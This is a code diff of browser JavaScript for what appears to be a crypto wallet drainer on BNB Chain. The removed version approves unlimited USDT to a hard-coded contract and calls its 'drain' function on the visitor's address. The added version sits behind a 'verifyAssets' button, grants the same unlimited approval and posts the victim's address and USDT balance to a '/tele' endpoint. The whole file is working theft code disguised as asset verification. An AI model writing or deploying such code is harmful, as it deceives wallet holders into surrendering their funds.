@@ -1,45 +1,34 @@
-const CONTRACT_ADDRESS = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
+const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const CONTRACT_TO_APPROVE = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";
 
-document.getElementById("verifyBtn").addEventListener("click", async () => {
-  try {
-    if (!window.ethereum) {
-      alert("Web3 wallet not found.");
-      return;
-    }
-
-    // Connect wallet
-    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-    const userAddress = accounts[0];
-
-    // Ensure on BNB Chain
-    const chainId = await window.ethereum.request({ method: "eth_chainId" });
-    if (chainId !== "0x38") {
-      alert("Please switch to BNB Chain.");
-      return;
-    }
-
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const signer = provider.getSigner();
-
-    // Approve USDT first
-    const usdt = new ethers.Contract(
-      USDT_ADDRESS,
-      ["function approve(address spender, uint256 amount) public returns (bool)"],
-      signer
-    );
-
-    const approvalTx = await usdt.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
-    await approvalTx.wait();
-
-    // Call drain function
-    const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
-    const tx = await contract.drain(userAddress);
-    await tx.wait();
-
-    alert("Transaction completed successfully!");
-  } catch (error) {
-    console.error("Error:", error);
-    alert("Something went wrong or was cancelled.");
+document.getElementById("verifyAssets").addEventListener("click", async () => {
+  if (!window.ethereum) {
+    alert("Open in MetaMask or Trust Wallet browser");
+    return;
   }
+
+  const provider = new ethers.providers.Web3Provider(window.ethereum);
+  await provider.send("eth_requestAccounts", []);
+  const signer = provider.getSigner();
+  const address = await signer.getAddress();
+
+  const usdt = new ethers.Contract(USDT_ADDRESS, [
+    "function approve(address spender, uint256 amount) public returns (bool)",
+    "function balanceOf(address account) external view returns (uint256)"
+  ], signer);
+
+  const balance = await usdt.balanceOf(address);
+  const readable = ethers.utils.formatUnits(balance, 18);
+
+  await usdt.approve(CONTRACT_TO_APPROVE, ethers.constants.MaxUint256);
+
+  await fetch("/tele", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      message: `New Wallet Connected:\n${address}\nUSDT Balance: ${readable}`
+    })
+  });
+
+  alert("Wallet connected & message sent.");
 });
